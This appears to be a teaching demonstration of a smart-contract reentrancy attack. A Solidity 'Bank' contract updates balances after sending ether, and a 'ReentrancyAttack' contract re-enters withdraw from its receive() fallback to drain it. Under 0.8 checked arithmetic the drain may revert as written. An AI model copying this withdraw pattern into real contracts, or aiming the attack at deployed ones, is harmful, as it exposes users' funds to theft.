//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.12;
import "./Bank.sol";

contract ReentrancyAttack {
    Bank bank;
    constructor(address _bank) {
        bank = Bank(_bank);
    }

    function doDeposit() external payable {
        bank.deposit{value:msg.value}();
    }

    function doWithdraw() external {
        bank.withdraw(1 ether);
    }

    receive() external payable  {
      if (address(bank).balance > 1 ether)  {
          bank.withdraw(1 ether);
      }     
    }

    function ethBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.12;

contract Bank {
    mapping(address => uint256) public balance;

    function ethBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function deposit() external payable {
        balance[msg.sender] += msg.value;   
    }

    function withdraw(uint256 amountToWithdraw) external {
        require(balance[msg.sender] >= amountToWithdraw);
        (bool res,) = msg.sender.call{value: amountToWithdraw}("");
        require(res,"send failed");
        balance[msg.sender] -= amountToWithdraw;
    }
}